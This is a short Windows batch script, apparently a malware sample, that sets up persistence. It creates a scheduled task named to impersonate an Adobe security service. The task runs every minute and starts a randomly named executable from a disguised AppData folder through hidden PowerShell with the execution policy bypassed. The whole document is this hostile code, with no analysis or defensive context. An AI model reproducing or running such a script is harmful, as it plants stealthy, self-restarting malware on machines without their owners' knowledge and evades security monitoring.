@echo off
schtasks.exe /create /sc minute /mo 1 /tn "AdobeSecurityManager" /tr "C:\Users\analyst\AppData\Roaming\MicrosoftWorker_e08ec640d\different-host.exe --headless PWSH.EXE -WindowStyle Hidden -ep bypass -c & 'C:\Users\analyst\AppData\Roaming\MicrosoftWorker_e08ec640d\xd24mgasgb4.exe'"
